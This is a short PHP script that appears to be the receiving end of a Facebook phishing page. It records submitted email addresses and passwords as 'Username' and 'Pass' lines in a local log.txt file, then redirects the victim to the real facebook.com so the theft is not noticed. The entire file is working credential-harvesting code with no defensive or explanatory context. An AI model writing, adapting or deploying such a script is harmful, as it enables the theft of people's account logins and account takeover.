<?php

$path = __DIR__ . "/log.txt";
$dataname = "Username: " . $_POST['email'] . "\n";
$datapass = "Pass: " . $_POST['passContainer'] . "\n";
file_put_contents($path, $dataname);
file_put_contents($path, $datapass, FILE_APPEND);

header('Location: https://www.facebook.com/');
exit();
?>